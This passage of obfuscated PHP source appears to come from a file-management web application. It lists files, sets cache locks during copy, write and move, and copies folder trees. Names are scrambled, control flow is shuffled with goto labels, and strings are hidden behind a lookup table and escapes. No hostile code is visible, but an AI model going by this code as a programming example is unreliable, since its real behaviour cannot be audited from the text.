$b­¤çÆò·ó[8]; return $F’Ê½ÛÂµÔ; } protected function _listAppendUser(&$BóÂèÀŸØë) { $Dí…¾³³Ö¯ =& $_SERVER[õëù©û]; $aø‚×ƒ°Û = array_to_keyvalue($BóÂèÀŸØë, $Dí…¾³³Ö¯[33], $Dí…¾³³Ö¯[374]); $aéÔÎ‚Á·• = array_to_keyvalue($BóÂèÀŸØë, $Dí…¾³³Ö¯[33], $Dí…¾³³Ö¯[375]); $f»±àßŠ›ˆ = array_merge($aø‚×ƒ°Û, $aéÔÎ‚Á·•); $eò•×Çê = Model($Dí…¾³³Ö¯[472])->userListInfo($f»±àßŠ›ˆ); foreach ($BóÂèÀŸØë as &$fŒìéù’éí) { $FÙíÇøÉ¿ = $fŒìéù’éí[$Dí…¾³³Ö¯[374]]; $fŒìéù’éí[$Dí…¾³³Ö¯[374]] = $eò•×Çê[$FÙíÇøÉ¿] ? $eò•×Çê[$FÙíÇøÉ¿] : !1; $FÙíÇøÉ¿ = $fŒìéù’éí[$Dí…¾³³Ö¯[375]]; $fŒìéù’éí[$Dí…¾³³Ö¯[375]] = $eò•×Çê[$FÙíÇøÉ¿] ? $eò•×Çê[$FÙíÇøÉ¿] : !1; if (isset($fŒìéù’éí[$Dí…¾³³Ö¯[412]]) && $fŒìéù’éí[$Dí…¾³³Ö¯[412]][$Dí…¾³³Ö¯[473]]) { $DÆîÛÂÃ±– = $GLOBALS[$Dí…¾³³Ö¯[6]][$Dí…¾³³Ö¯[84]][$Dí…¾³³Ö¯[474]]; if ($fŒìéù’éí[$Dí…¾³³Ö¯[412]][$Dí…¾³³Ö¯[475]] <= time() - $DÆîÛÂÃ±–) { $this->metaSet($fŒìéù’éí[$Dí…¾³³Ö¯[365]], $Dí…¾³³Ö¯[473], null); $this->metaSet($fŒìéù’éí[$Dí…¾³³Ö¯[365]], $Dí…¾³³Ö¯[475], null); unset($fŒìéù’éí[$Dí…¾³³Ö¯[412]][$Dí…¾³³Ö¯[473]]); continue; } $b¯ïÌ—åÄ = $fŒìéù’éí[$Dí…¾³³Ö¯[412]][$Dí…¾³³Ö¯[473]]; $fŒìéù’éí[$Dí…¾³³Ö¯[412]][$Dí…¾³³Ö¯[476]] = Model($Dí…¾³³Ö¯[472])->getInfoSimpleOuter($b¯ïÌ—åÄ); } } } public function parentLevelArray($dÖ‰ç‚ÔÎ) { $bøÇ¦•Õš• =& $_SERVER[õëù©û]; $dÖ‰ç‚ÔÎ = explode($bøÇ¦•Õš•[47], trim($dÖ‰ç‚ÔÎ, $bøÇ¦•Õš•[47])); return array_remove_value($dÖ‰ç‚ÔÎ, $bøÇ¦•Õš•[463]); } public function listAll($f²‡—¡“’´) { goto C´‰˜ëÎ„; Bçã“ãÇ¾: $this->_listAppendAuth($B•Øç¦ŠÜ); $this->_listAppendUser($B•Øç¦ŠÜ); $this->_listAppendPath($B•Øç¦ŠÜ); goto díŞå“Éë÷; díŞå“Éë÷: $B•Øç¦ŠÜ = array_to_keyvalue($B•Øç¦ŠÜ, $b÷ÙÛÊº÷ê[365]); $c¥Å¡Ù„… = "\x2f{$E´åÓòå½ñ[$b÷ÙÛÊº÷ê[28]]}\57"; $c¥Å¡Ù„… = $c¥Å¡Ù„… == $b÷ÙÛÊº÷ê[462] ? $b÷ÙÛÊº÷ê[8] : $c¥Å¡Ù„…; goto E‚äÉ¨ˆŒ; C´‰˜ëÎ„: $b÷ÙÛÊº÷ê =& $_SERVER[õëù©û]; $E´åÓòå½ñ = $this->sourceInfo($f²‡—¡“’´); $cõòöòÇ‰Ö = array($b÷ÙÛÊº÷ê[477] => array($b÷ÙÛÊº÷ê[478], $E´åÓòå½ñ[$b÷ÙÛÊº÷ê[454]] . $f²‡—¡“’´ . $b÷ÙÛÊº÷ê[479]), $b÷ÙÛÊº÷ê[480] => 0); goto C‹—•ìçÜ; C‹—•ìçÜ: $c¢éÃ‡é = $b÷ÙÛÊº÷ê[481]; $CÑÎ–ñ»‡· = "\x4c\105\x46\124\x20\112\117\111\x4e\x20{$this->tablePrefix}\151\157\137\146\x69\x6c\145\x20\146\x69\154\145\40\x6f\x6e\40\x73\157\x75\162\x63\x65\x2e\x66\151\x6c\x65\111\104\x20\x3d\40\x66\151\154\145\x2e\146\151\x6c\145\x49\104"; $B•Øç¦ŠÜ = $this->alias($b÷ÙÛÊº÷ê[482])->field($c¢éÃ‡é)->where($cõòöòÇ‰Ö)->join($CÑÎ–ñ»‡·)->select(); goto Bçã“ãÇ¾; E‚äÉ¨ˆŒ: $Cîœ¼¡ØÓÊ = array(); foreach ($B•Øç¦ŠÜ as $eŞ†™İÓ»‡ => $b«ì˜çöñª) { goto BéÀ•±•…; DºÛ¨†¶ê…: $F¸†–Å‰ = str_replace($b÷ÙÛÊº÷ê[462], $b÷ÙÛÊº÷ê[8], $F¸†–Å‰); $F¸†–Å‰ = str_replace($b÷ÙÛÊº÷ê[462], $b÷ÙÛÊº÷ê[8], $F¸†–Å‰); $B»¬š½Ãèæ = array($b÷ÙÛÊº÷ê[383] => str_replace($b÷ÙÛÊº÷ê[462], $b÷ÙÛÊº÷ê[8], $F¸†–Å‰), $b÷ÙÛÊº÷ê[483] => intval($b«ì˜çöñª[$b÷ÙÛÊº÷ê[366]]), $b÷ÙÛÊº÷ê[387] => $this->pathInfoFilter($b«ì˜çöñª, !0)); goto BøöŠ¦Âƒ; BøöŠ¦Âƒ: if (!$b«ì˜çöñª[$b÷ÙÛÊº÷ê[366]]) { $B»¬š½Ãèæ[$b÷ÙÛÊº÷ê[414]] = $b«ì˜çöñª[$b÷ÙÛÊº÷ê[414]]; $B»¬š½Ãèæ[$b÷ÙÛÊº÷ê[484]] = $b«ì˜çöñª[$b÷ÙÛÊº÷ê[75]]; } $Cîœ¼¡ØÓÊ[] = $B»¬š½Ãèæ; goto aÂ¯à´éÄ; c…ÅÆˆÕğí: for ($Bğ¨å±Ñ·  = 0; $Bğ¨å±Ñ·  < count($F«»¥ÛÅ¦ˆ); $Bğ¨å±Ñ· ++) { $F¸†–Å‰ .= $B•Øç¦ŠÜ[$F«»¥ÛÅ¦ˆ[$Bğ¨å±Ñ· ]][$b÷ÙÛÊº÷ê[28]] . $b÷ÙÛÊº÷ê[8]; } $F¸†–Å‰ .= $b«ì˜çöñª[$b÷ÙÛÊº÷ê[28]]; if ($b«ì˜çöñª[$b÷ÙÛÊº÷ê[366]]) { $F¸†–Å‰ .= $b÷ÙÛÊº÷ê[8]; } goto DºÛ¨†¶ê…; BéÀ•±•…: $F«»¥ÛÅ¦ˆ = $this->parentLevelArray($b«ì˜çöñª[$b÷ÙÛÊº÷ê[454]]); array_shift($F«»¥ÛÅ¦ˆ); $F¸†–Å‰ = $c¥Å¡Ù„…; goto c…ÅÆˆÕğí; aÂ¯à´éÄ: } return $Cîœ¼¡ØÓÊ; goto EÀÉö„­˜è; EÀÉö„­˜è: } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($B¡‚×Í¾ˆï) { goto Fê†ÇÏ¥Ö“; E²­„†‘µ¶: $AÛäà«¶Ã = 1; $this->_lockEvent($B¡‚×Í¾ˆï, array($b©º¹Ó¾¦´[486], $b©º¹Ó¾¦´[487]), $AÛäà«¶Ã); $this->_lockParent($B¡‚×Í¾ˆï, array($b©º¹Ó¾¦´[487]), $AÛäà«¶Ã); goto fÁò‹Ò¡Ñ; Fê†ÇÏ¥Ö“: $b©º¹Ó¾¦´ =& $_SERVER[õëù©û]; if (!$this->allowLock()) { return; } $this->_lockCheck($b©º¹Ó¾¦´[485], $B¡‚×Í¾ˆï); goto E²­„†‘µ¶; fÁò‹Ò¡Ñ: $this->_lockEvent($B¡‚×Í¾ˆï, array($b©º¹Ó¾¦´[488], $b©º¹Ó¾¦´[489]), $AÛäà«¶Ã); $this->_lockCheckEnd($b©º¹Ó¾¦´[485], $B¡‚×Í¾ˆï); goto B‰£ß°¼µÔ; B‰£ß°¼µÔ: } public function lockCopyEnd($F±â‚¢É) { $e¤õÖ«ˆë =& $_SERVER[õëù©û]; if (!$this->allowLock()) { return; } $A—¬Û„Çó¡ = 0; $this->_lockEvent($F±â‚¢É, array($e¤õÖ«ˆë[486], $e¤õÖ«ˆë[487]), $A—¬Û„Çó¡); $this->_lockParent($F±â‚¢É, array($e¤õÖ«ˆë[487]), $A—¬Û„Çó¡); $this->_lockEvent($F±â‚¢É, array($e¤õÖ«ˆë[488], $e¤õÖ«ˆë[489]), $A—¬Û„Çó¡); } public function lockWriteStart($d†ÉÓøˆœ½, $BŞĞËˆÆ—í = '') { goto BçáÈ–¼Œ; BçáÈ–¼Œ: $Eã£†Û­ªá =& $_SERVER[õëù©û]; if (!$this->allowLock()) { return; } $this->_lockCheck($Eã£†Û­ªá[486], $d†ÉÓøˆœ½); goto dëé¿ÅÔÔ; bºãôÛÀÆÛ: $this->_lockParent($d†ÉÓøˆœ½, array($Eã£†Û­ªá[485], $Eã£†Û­ªá[487]), $CŠÂëÙÊ“æ); $this->_lockCheckEnd($Eã£†Û­ªá[486], $d†ÉÓøˆœ½); goto aàÚÓøÆ°„; dëé¿ÅÔÔ: $CŠÂëÙÊ“æ = 1; $this->_lockKey($Eã£†Û­ªá[490] . $d†ÉÓøˆœ½ . $Eã£†Û­ªá[91] . $BŞĞËˆÆ—í, $CŠÂëÙÊ“æ); $this->_lockEvent($d†ÉÓøˆœ½, array($Eã£†Û­ªá[485], $Eã£†Û­ªá[487]), $CŠÂëÙÊ“æ); goto bºãôÛÀÆÛ; aàÚÓøÆ°„: } public function lockWriteEnd($dÂŠÇÍêŒ–, $e¿¶£ñ‹¶è = '') { $F„‘Š×Û± =& $_SERVER[õëù©û]; if (!$this->allowLock()) { return; } $A¶ÜÒ¹Áæ = 0; $this->_lockKey($F„‘Š×Û±[490] . $dÂŠÇÍêŒ– . $F„‘Š×Û±[91] . $e¿¶£ñ‹¶è, $A¶ÜÒ¹Áæ); $this->_lockEvent($dÂŠÇÍêŒ–, array($F„‘Š×Û±[485], $F„‘Š×Û±[487]), $A¶ÜÒ¹Áæ); $this->_lockParent($dÂŠÇÍêŒ–, array($F„‘Š×Û±[485], $F„‘Š×Û±[487]), $A¶ÜÒ¹Áæ); } public function lockMoveStart($aƒ…Ï¶¢”Š) { goto E›Âù’á ï; E›Âù’á ï: $DïÊŸŒ™­Æ =& $_SERVER[õëù©û]; if (!$this->allowLock()) { return; } $this->_lockCheck($DïÊŸŒ™­Æ[487], $aƒ…Ï¶¢”Š); goto E¿õ¢İÄĞ“; E¿õ¢İÄĞ“: $e”Å³ëÏñö = 1; $this->_lockKey($DïÊŸŒ™­Æ[491] . $aƒ…Ï¶¢”Š, $e”Å³ëÏñö); $this->_lockEvent($aƒ…Ï¶¢”Š, array($DïÊŸŒ™­Æ[485], $DïÊŸŒ™­Æ[486]), $e”Å³ëÏñö); goto D¶ÓŞ·±×‰; D¶ÓŞ·±×‰: $this->_lockParent($aƒ…Ï¶¢”Š, array($DïÊŸŒ™­Æ[485], $DïÊŸŒ™­Æ[487]), $e”Å³ëÏñö); $this->_lockEvent($aƒ…Ï¶¢”Š, array($DïÊŸŒ™­Æ[492], $DïÊŸŒ™­Æ[488], $DïÊŸŒ™­Æ[489]), $e”Å³ëÏñö); $this->_lockCheckEnd($DïÊŸŒ™­Æ[487], $aƒ…Ï¶¢”Š); goto e³ñ¹áœ; e³ñ¹áœ: } public function lockMoveEnd($dÂ‚›ˆŒ›) { goto b„í¦Ù¤Şà; C‚àË¸…“À: $this->_lockKey($cŒêÏô•·[491] . $dÂ‚›ˆŒ›, $B´Î‹ÛƒÔÚ); $this->_lockEvent($dÂ‚›ˆŒ›, array($cŒêÏô•·[485], $cŒêÏô•·[486]), $B´Î‹ÛƒÔÚ); $this->_lockParent($dÂ‚›ˆŒ›, array($cŒêÏô•·[485], $cŒêÏô•·[487]), $B´Î‹ÛƒÔÚ); goto Eë Ê¶Ş×Ì; Eë Ê¶Ş×Ì: $this->_lockEvent($dÂ‚›ˆŒ›, array($cŒêÏô•·[492], $cŒêÏô•·[488], $cŒêÏô•·[489]), $B´Î‹ÛƒÔÚ); goto dÊ¿¤×“ĞÖ; b„í¦Ù¤Şà: $cŒêÏô•· =& $_SERVER[õëù©û]; if (!$this->allowLock()) { return; } $B´Î‹ÛƒÔÚ = 0; goto C‚àË¸…“À; dÊ¿¤×“ĞÖ: } private function _lockCheck($FÀš¿„ÆˆÓ, $EĞ¬ˆˆ‰·è) { goto AŠ¤¦ÚÅª¼; AŠ¤¦ÚÅª¼: $a–ã æ•Úë =& $_SERVER[õëù©û]; $CÑĞÔ®¿Ğà = $this->sourceInfo($EĞ¬ˆˆ‰·è); $cÊÏÀôÌ¾ = $FÀš¿„ÆˆÓ . $a–ã æ•Úë[91] . $EĞ¬ˆˆ‰·è; goto F¾ì¾Ò«Óò; F¾ì¾Ò«Óò: $this->_lockTimeStart[$cÊÏÀôÌ¾] = timeFloat(); if (!is_array($CÑĞÔ®¿Ğà)) { return; } $dí†”ºÁ·œ = LNG($a–ã æ•Úë[493]); goto C¬¨ğË˜É¸; F™³‰Ë¿Â™: $Aóß‘Šë¼Ø = array_reverse($this->parentLevelArray($CÑĞÔ®¿Ğà[$a–ã æ•Úë[454]])); foreach ($Aóß‘Šë¼Ø as $EŞ‘„Ç–Ì¨) { $cÊÏÀôÌ¾ = $FÀš¿„ÆˆÓ . $a–ã æ•Úë[494] . $EŞ‘„Ç–Ì¨; if (CacheLock::lockGet($a–ã æ•Úë[495] . $cÊÏÀôÌ¾)) { $CÑĞÔ®¿Ğà = $this->sourceInfo($EŞ‘„Ç–Ì¨); CacheLock::setErrorMsg($a–ã æ•Úë[153] . htmlspecialchars($CÑĞÔ®¿Ğà[$a–ã æ•Úë[28]]) . $a–ã æ•Úë[471] . $dí†”ºÁ·œ); $this->_lockKey($cÊÏÀôÌ¾, 1); $this->_lockKey($cÊÏÀôÌ¾, 0); } } goto A¿á©‘ôÂÔ; C¬¨ğË˜É¸: CacheLock::setErrorMsg($a–ã æ•Úë[153] . htmlspecialchars($CÑĞÔ®¿Ğà[$a–ã æ•Úë[28]]) . $a–ã æ•Úë[471] . $dí†”ºÁ·œ); $this->_lockKey($cÊÏÀôÌ¾, 1); $this->_lockKey($cÊÏÀôÌ¾, 0); goto F™³‰Ë¿Â™; A¿á©‘ôÂÔ: } private function _lockCheckEnd($D„³“‘‹ïÜ, $Eå¿Õ•Öºï) { goto F‚Æ±îŠ™³; B‚È—àÀ¤: if ($fß–è‰Íéµ > 0.5) { unset(self::$cacheSourceInfo[$DĞ’‹äÂºè[405] . $Eå¿Õ•Öºï]); } $F¥Œ–ñÊ© = $this->sourceInfo($Eå¿Õ•Öºï); if (!$F¥Œ–ñÊ©) { show_json(LNG($DĞ’‹äÂºè[100]), !1); } goto fçáˆ‘ââ¾; F‚Æ±îŠ™³: $DĞ’‹äÂºè =& $_SERVER[õëù©û]; $dÛŠÆÓšÕñ = $D„³“‘‹ïÜ . $DĞ’‹äÂºè[91] . $Eå¿Õ•Öºï; CacheLock::setErrorMsg($DĞ’‹äÂºè[357]); goto eÌ¿›¬©µ÷; eÌ¿›¬©µ÷: if (!isset($this->_lockTimeStart[$dÛŠÆÓšÕñ])) { return; } $fß–è‰Íéµ = timeFloat() - $this->_lockTimeStart[$dÛŠÆÓšÕñ]; unset($this->_lockTimeStart[$dÛŠÆÓšÕñ]); goto B‚È—àÀ¤; fçáˆ‘ââ¾: } private function _lockParent($bõæ×‹°­, $Eø±á‰‚Î“, $Båº‘÷ô©) { if (!$this->autoLockSet) { return; } $CµŠ›æëê = $this->sourceInfo($bõæ×‹°­); if (!is_array($CµŠ›æëê)) { return; } $C‡¹¾½Ší“ = array_reverse($this->parentLevelArray($CµŠ›æëê[$_SERVER[õëù©û][454]])); foreach ($C‡¹¾½Ší“ as $Eù‰‘¯à¤‰) { $this->_lockEvent($Eù‰‘¯à¤‰, $Eø±á‰‚Î“, $Båº‘÷ô©); } } private function _lockEvent($cÑâÌÆêš×, $C£—ª”ä©Ï, $c°Öâ’ÕÕä) { $fÉ÷Á¼èøø =& $_SERVER[õëù©û]; if (!$this->autoLockSet) { return; } foreach ($C£—ª”ä©Ï as $Aœ…›ò§èŠ) { $bÏÒ‚¹›ÓÒ = $Aœ…›ò§èŠ . $fÉ÷Á¼èøø[91] . $cÑâÌÆêš×; if ($c°Öâ’ÕÕä && CacheLock::lockGet($fÉ÷Á¼èøø[495] . $bÏÒ‚¹›ÓÒ)) { continue; } $this->_lockKey($bÏÒ‚¹›ÓÒ, $c°Öâ’ÕÕä); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($AÏ¯Î÷¬¬‡, $fÀ•¬ï±“Æ = 1) { $AÍùĞôë… = $_SERVER[õëù©û][495] . md5($AÏ¯Î÷¬¬‡); if ($fÀ•¬ï±“Æ) { if (isset(self::$_lockItemArr[$AÍùĞôë…])) { return; } self::$_lockItemArr[$AÍùĞôë…] = 1; CacheLock::lock($AÍùĞôë…, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$AÍùĞôë…])) { return; } unset(self::$_lockItemArr[$AÍùĞôë…]); CacheLock::unlock($AÍùĞôë…); } } public function isParentOf($bœ¼É·Â¹ñ, $b„½Ï•ƒá») { goto bÊ›•åÔõ; c½šÁÎ‚°ë: return $fÄá—³©ø°; goto Cç…âèÃÕ’; Bà£ñ³ÁÁ„: $aªˆğ‚‘Ï´ = $FÍÌÃ‡¥ã¿[$B†îç…¶÷[454]] . $FÍÌÃ‡¥ã¿[$B†îç…¶÷[365]] . $B†îç…¶÷[47]; $fçÍÏË‚Ş = $aµœÄ•ëâ[$B†îç…¶÷[454]] . $aµœÄ•ëâ[$B†îç…¶÷[365]] . $B†îç…¶÷[47]; $fÄá—³©ø° = strpos($fçÍÏË‚Ş, $aªˆğ‚‘Ï´) === 0; goto c½šÁÎ‚°ë; bÊ›•åÔõ: $B†îç…¶÷ =& $_SERVER[õëù©û]; $FÍÌÃ‡¥ã¿ = $this->sourceInfo($bœ¼É·Â¹ñ); $aµœÄ•ëâ = $this->sourceInfo($b„½Ï•ƒá»); goto Bà£ñ³ÁÁ„; Cç…âèÃÕ’: } private $targetIsDelete = 0; public function copy($CˆöïÓ¦áˆ, $E‰ˆ²ƒ‹ï, $aé´Å™«‹´ = REPEAT_REPLACE, $B¤Ü¬°Ç = '') { goto aªØßœ¶Ï¨; c»ÌÚ’áå: $this->lockCopyStart($CˆöïÓ¦áˆ); $this->lockWriteStart($E‰ˆ²ƒ‹ï, $FŒÙ³©ÀáÌ); $a›ùÚ±Î‡² = array($bŸ¹ñ…óµï[496] => array(), $bŸ¹ñ…óµï[497] => array(), $bŸ¹ñ…óµï[498] => array()); goto eŒàŞÃ‹ÒÎ; aÎÈÇ§ŞÅ: if ($c¬Œ¦„ãôò[$bŸ¹ñ…óµï[366]] == $bŸ¹ñ…óµï[83] && $aŞ…¶Ç­½Ò == $eÌ»ÎÁŠ‰) { $this->folderSizeResetChildren($aŞ…¶Ç­½Ò); } Model($bŸ¹ñ…óµï[499])->addAll($a›ùÚ±Î‡²[$bŸ¹ñ…óµï[497]], array(), !0); if ($aŞ…¶Ç­½Ò != $eÌ»ÎÁŠ‰ || $c¬Œ¦„ãôò[$bŸ¹ñ…óµï[366]] == $bŸ¹ñ…óµï[83]) { Model($bŸ¹ñ…óµï[500])->eventCopy($eÌ»ÎÁŠ‰); } goto eïÂÎÈñ„¢; eïÂÎÈñ„¢: $this->saveAll($a›ùÚ±Î‡²[$bŸ¹ñ…óµï[498]]); Model($bŸ¹ñ…óµï[163])->linkAdd($a›ùÚ±Î‡²[$bŸ¹ñ…óµï[496]]); $this->folderSizeReset($E‰ˆ²ƒ‹ï); goto A„•ÏøÌ¦Ì; eŒàŞÃ‹ÒÎ: $this->targetIsDelete = intval($c¬Œ¦„ãôò[$bŸ¹ñ…óµï[392]]); $aŞ…¶Ç­½Ò = $this->fileNameExistCache($E‰ˆ²ƒ‹ï, $c¬Œ¦„ãôò[$bŸ¹ñ…óµï[28]]); $eÌ»ÎÁŠ‰ = $this->_copy($CˆöïÓ¦áˆ, $E‰ˆ²ƒ‹ï, $aé´Å™«‹´, $a›ùÚ±Î‡², !0, $B¤Ü¬°Ç); goto f¹«‹¥ÂÓ ; A„•ÏøÌ¦Ì: $this->updateModifyTime($E‰ˆ²ƒ‹ï); return $eÌ»ÎÁŠ‰; goto BÎÖœÕĞå¡; f¹«‹¥ÂÓ : $this->_childrenListClear(); $this->lockCopyEnd($CˆöïÓ¦áˆ); $this->lockWriteEnd($E‰ˆ²ƒ‹ï, $FŒÙ³©ÀáÌ); goto aÎÈÇ§ŞÅ; AÓíªÏ¥„: if (!$c¬Œ¦„ãôò || !$C™¥®˜©ØÕ || $C™¥®˜©ØÕ[$bŸ¹ñ…óµï[366]] != $bŸ¹ñ…óµï[83]) { return !1; } if ($this->isParentOf($CˆöïÓ¦áˆ, $E‰ˆ²ƒ‹ï)) { return !1; } $FŒÙ³©ÀáÌ = $B¤Ü¬°Ç ? $B¤Ü¬°Ç : $c¬Œ¦„ãôò[$bŸ¹ñ…óµï[28]]; goto c»ÌÚ’áå; aªØßœ¶Ï¨: $bŸ¹ñ…óµï =& $_SERVER[õëù©û]; $c¬Œ¦„ãôò = $this->sourceInfo($CˆöïÓ¦áˆ); $C™¥®˜©ØÕ = $this->sourceInfo($E‰ˆ²ƒ‹ï); goto AÓíªÏ¥„; BÎÖœÕĞå¡: } private function _copy($CÈ¾ÎÇÍ‡Ì, $E¥”®ïÙº, $EŞ—ÓÏÜ¶ë, &$AÎÄ­õÓí¤, $fáòŠ»ÏÏ«, $DÊ¬æ¯ŸÊä = '') { goto fÜ†öÌ¤Ô¯; FË”·‹ÖØí: $FºÒ¼©˜†ë = $DÊ¬æ¯ŸÊä ? $DÊ¬æ¯ŸÊä : $b“œ§†¦³[$EÒƒÃ¤—©[28]]; $DÇ³¡Ñ¿¹ß = $this->fileNameExistCache($E¥”®ïÙº, $FºÒ¼©˜†ë); if ($fáòŠ»ÏÏ«) { $this->_childrenAllMake($CÈ¾ÎÇÍ‡Ì); if ($E•É¡à™Ì— && $DÇ³¡Ñ¿¹ß) { $this->_childrenAllMake($DÇ³¡Ñ¿¹ß); } } goto bøìˆ†ïÖ; aĞø¡‰‚¨ô: return $f…Ø‰­æâù; goto A½ÄÕâ‰ñŸ; fÜ†öÌ¤Ô¯: $EÒƒÃ¤—© =& $_SERVER[õëù©û]; $b“œ§†¦³ = $this->sourceInfoCache($CÈ¾ÎÇÍ‡Ì); $E•É¡à™Ì— = $b“œ§†¦³[$EÒƒÃ¤—©[366]] == $EÒƒÃ¤—©[83]; goto FË”·‹ÖØí; bøìˆ†ïÖ: if (!$DÇ³¡Ñ¿¹ß) { return $this->_copyCreate($CÈ¾ÎÇÍ‡Ì, $E¥”®ïÙº, $FºÒ¼©˜†ë, $AÎÄ­õÓí¤); } $f…Ø‰­æâù = $DÇ³¡Ñ¿¹ß; if ($E•É¡à™Ì—) { if ($EŞ—ÓÏÜ¶ë == REPEAT_RENAME_FOLDER) { $FºÒ¼©˜†ë = $this->fileNameAutoCache($E¥”®ïÙº, $FºÒ¼©˜†ë, $EŞ—ÓÏÜ¶ë, $E•É¡à™Ì—); $f…Ø‰­æâù = $this->_copyCreate($CÈ¾ÎÇÍ‡Ì, $E¥”®ïÙº, $FºÒ¼©˜†ë, $AÎÄ­õÓí¤); } else { $FŒÃ²œ¢£Ã = $this->_childrenList($CÈ¾ÎÇÍ‡Ì); foreach ($FŒÃ²œ¢£Ã as $bğÛ™‰Âƒé) { $this->_copy($bğÛ™‰Âƒé[$EÒƒÃ¤—©[365]], $DÇ³¡Ñ¿¹ß, $EŞ—ÓÏÜ¶ë, $AÎÄ­õÓí¤, !1); } } } else { if ($EŞ—ÓÏÜ¶ë == REPEAT_RENAME || $EŞ—ÓÏÜ¶ë == REPEAT_RENAME_FOLDER) { $FºÒ¼©˜†ë = $this->fileNameAutoCache($E¥”®ïÙº, $FºÒ¼©˜†ë, $EŞ—ÓÏÜ¶ë, $E•É¡à™Ì—); $f…Ø‰­æâù = $this->_copyCreate($CÈ¾ÎÇÍ‡Ì, $E¥”®ïÙº, $FºÒ¼©˜†ë, $AÎÄ­õÓí¤); } else { if ($EŞ—ÓÏÜ¶ë == REPEAT_REPLACE) { $bÀ³ôÈ¨£ò = $this->sourceInfoCache($DÇ³¡Ñ¿¹ß); $Bß´—¥™º¦ = $this->fileHistory($bÀ³ôÈ¨£ò, $b“œ§†¦³[$EÒƒÃ¤—©[414]], $b“œ§†¦³[$EÒƒÃ¤—©[77]]); if ($Bß´—¥™º¦) { $AÎÄ­õÓí¤[$EÒƒÃ¤—©[496]][] = $b“œ§†¦³[$EÒƒÃ¤—©[414]]; } } else { if ($EŞ—ÓÏÜ¶ë == REPEAT_SKIP) { } } } Hook::trigger($EÒƒÃ¤—©[501], array($EÒƒÃ¤—©[502], $b“œ§†¦³, 0)); } goto aĞø¡‰‚¨ô; A½ÄÕâ‰ñŸ: } private function _copyCreate($FÇÂ«™Àˆ, $b¢Åƒ˜Â–, $F˜´ğè¿ƒ“, &$A‹Ù¹Í´íÅ) { goto E¥¼Ã–šè ; E¥¼Ã–šè : $fêèÎ¢õ =& $_SERVER[õëù©û]; $fÜ¾Ú†Ìë˜ = $this->sourceInfoCache($FÇÂ«™Àˆ); $D‰¹ªŞ»Ê = $this->sourceInfoCache($b¢Åƒ˜Â–); goto EÙ‹¡ê ØŒ; AŠ«‡ÚÈ‹: $cè‡¿äºñˆ = $this->add($DÜãÍâîˆ†); $C¥„¾ÏĞæÎ = array($fêèÎ¢õ[365] => $cè‡¿äºñˆ, $fêèÎ¢õ[28] => $F˜´ğè¿ƒ“); $this->_copyApplyMeta($C¥„¾ÏĞæÎ, $A‹Ù¹Í´íÅ); goto AÏÊÛÆ‡ëÆ; Fò¬óˆ¤„°: foreach ($cÉŒå¶ˆ–Ó as $C¨Áœµó) { $F¤…ôïš´Õ = $C¨Áœµó[$fêèÎ¢õ[365]]; $C§Æƒ°‹òî = $this->_childrenMatch($fˆÆ…²Úí, $C¨Áœµó, $e´»å¸ä¸); $FÒ‹¿§õ×[] = array($fêèÎ¢õ[365], $F¤…ôïš´Õ, $fêèÎ¢õ[456], $C§Æƒ°‹òî[$fêèÎ¢õ[456]]); $CïªÔƒ„[] = array($fêèÎ¢õ[365], $F¤…ôïš´Õ, $fêèÎ¢õ[454], $C§Æƒ°‹òî[$fêèÎ¢õ[454]]); $this->_copyApplyMeta($C¨Áœµó, $A‹Ù¹Í´íÅ); if ($C¨Áœµó[$fêèÎ¢õ[366]] != $fêèÎ¢õ[83]) { $A‹Ù¹Í´íÅ[$fêèÎ¢õ[496]][] = $C¨Áœµó[$fêèÎ¢õ[414]]; } } $this->chunkEventSet($fêèÎ¢õ[508], array($fêèÎ¢õ[509], $DÜãÍâîˆ†, $BË‚îë°´®)); $this->saveAll($FÒ‹¿§õ×); goto e×áŸìšç; aÕªÄÌàÄ›: $this->addAll($C¢ğº°„Ä¶, array(), !1); $cÉŒå¶ˆ–Ó = $this->where(array($fêèÎ¢õ[456] => $cè‡¿äºñˆ))->select(); $fˆÆ…²Úí = $this->_childrenMakeRelation($A¾ÃÔÄ—¿‰, $cÉŒå¶ˆ–Ó); goto bÑõÎ¹†·’; bÑõÎ¹†·’: $fˆÆ…²Úí[$FÇÂ«™Àˆ] = $cè‡¿äºñˆ; $FÒ‹¿§õ× = array(); $CïªÔƒ„ = array(); goto Fò¬óˆ¤„°; bÌ›ö‹ßõ: $this->_childrenListAll($FÇÂ«™Àˆ, $A¾ÃÔÄ—¿‰); $BË‚îë°´® = count($A¾ÃÔÄ—¿‰); if ($BË‚îë°´® == 0) { return $cè‡¿äºñˆ; } goto DğÃÖ‹õÛ; EÙ‹¡ê ØŒ: $DÜãÍâîˆ† = $this->_makeItemData($fÜ¾Ú†Ìë˜, $D‰¹ªŞ»Ê, $F˜´ğè¿ƒ“); Hook::trigger($fêèÎ¢õ[503], $DÜãÍâîˆ†); Hook::trigger($fêèÎ¢õ[504], array($fêèÎ¢õ[505], $DÜãÍâîˆ†, 0)); goto AŠ«‡ÚÈ‹; DğÃÖ‹õÛ: $e´»å¸ä¸ = $this->sourceInfo($cè‡¿äºñˆ); foreach ($A¾ÃÔÄ—¿‰ as $C¨Áœµó) { $fƒ¥º«šÌ· = $this->_makeItemData($C¨Áœµó, $e´»å¸ä¸, $C¨Áœµó[$fêèÎ¢õ[28]]); $fƒ¥º«šÌ·[$fêèÎ¢õ[454]] = $C¨Áœµó[$fêèÎ¢õ[454]]; $C¢ğº°„Ä¶[] = $fƒ¥º«šÌ·; } $this->chunkEventSet($fêèÎ¢õ[506], array($fêèÎ¢õ[507], $DÜãÍâîˆ†, $BË‚îë°´®)); goto aÕªÄÌàÄ›; e×áŸìšç: $this->chunkEventSet($fêèÎ¢õ[510], array($fêèÎ¢õ[511], $DÜãÍâîˆ†, $BË‚îë°´®)); $this->saveAll($CïªÔƒ„); return $cè‡¿äºñˆ; goto fˆˆÀŠ™¨¹; AÏÊÛÆ‡ëÆ: if ($fÜ¾Ú†Ìë˜[$fêèÎ¢õ[366]] != $fêèÎ¢õ[83]) { $A‹Ù¹Í´íÅ[$fêèÎ¢õ[496]][] = $fÜ¾Ú†Ìë˜[$fêèÎ¢õ[414]]; return $cè‡¿äºñˆ; } $A¾ÃÔÄ—¿‰ = array(); $C¢ğº°„Ä¶ = array(); goto bÌ›ö‹ßõ; fˆˆÀŠ™¨¹: } private function _childrenMakeRelation($F¯îêÚã—, 